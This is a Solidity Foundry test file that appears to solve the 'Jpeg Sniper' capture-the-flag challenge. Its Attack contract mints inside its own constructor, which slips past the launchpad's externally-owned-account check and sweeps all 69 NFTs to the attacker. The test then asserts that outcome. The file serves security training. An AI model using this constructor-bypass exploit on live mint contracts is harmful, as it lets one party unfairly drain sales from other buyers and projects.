// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Jpeg-Sniper/FlatLaunchpeg.sol";
import "../src/Jpeg-Sniper/BaseLaunchpegNFT.sol";
import "../src/Jpeg-Sniper/LaunchpegErrors.sol";
import "@forge-std/Test.sol";

/// @title Attack contract deployed by attacker to exploit the vulnerablity
/// @author viking71

contract Attack {
    FlatLaunchpeg public flatlaunchpegContract;
    address public owner;

    /// @notice while deploying a contract, code inside are not considered to in code size, which makes contract address like a EOA 
    constructor(address flpAddress, address attackerAddress) {
        owner = attackerAddress; // assigning the owner of the contract which is the attacker
        flatlaunchpegContract = FlatLaunchpeg(flpAddress); // instantiating the contract at the given address
        uint i = 0; // variable to keep track of the token ids
        uint quan = flatlaunchpegContract.maxBatchSize(); // storing batch size - 5
        uint collect = flatlaunchpegContract.collectionSize(); // storing collection size - 69
        // looping until the total supply is met
        while(flatlaunchpegContract.totalSupply() < collect) {
            // checking whether batch size is not exceeding 
            if(quan + flatlaunchpegContract.totalSupply() >= collect){
                quan--; 
            }
            flatlaunchpegContract.publicSaleMint(quan); // minting the NFTs
            // transferring the NFTs to attacker
            for (uint k = i; k < quan + i; k++) {
                flatlaunchpegContract.transferFrom(address(this), owner, k);
            }
            i = i + quan; // incrementing the token id
        }
    }
}

contract JpegSniperTest is Test {
    address public attacker = address(1);

    FlatLaunchpeg public flatlaunchpeg;
    function setUp() public {
        flatlaunchpeg = new FlatLaunchpeg(69, 5, 5); // deploying the marketplace
    }

    function testExploit() public {
        // attacker deploying the Attack contract
        vm.startPrank(attacker);
        Attack attack = new Attack(address(flatlaunchpeg), attacker);
        vm.stopPrank();

        // verifying whether the attacker minted max tokens
        assertEq(flatlaunchpeg.balanceOf(attacker), 69);
        assertEq(flatlaunchpeg.totalSupply(), 69);
    }
}